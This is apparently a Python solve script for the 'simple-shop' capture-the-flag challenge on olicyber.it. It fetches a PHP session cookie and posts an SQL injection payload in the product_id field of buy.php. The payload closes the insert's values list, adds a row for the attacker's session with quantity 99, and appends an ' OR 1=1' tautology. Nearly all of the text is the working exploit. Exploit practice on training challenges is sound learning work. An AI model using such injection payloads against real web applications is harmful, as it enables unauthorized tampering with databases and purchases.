import requests, string
from pwn import *

URL = "https://simple-shop.challs.olicyber.it"
ALPH = string.printable
flag = ""

query = "1"

s = requests.Session()
r = s.get(URL)
session = r.cookies.get_dict()["PHPSESSID"]
r = s.post(URL + "/buy.php", data={f"product_id": "1), (\"{session}\", 99); -- -' OR 1=1 -- -"}, allow_redirects=False)
print(r.status_code, r.text)
risp = s.get(URL).text
print(risp)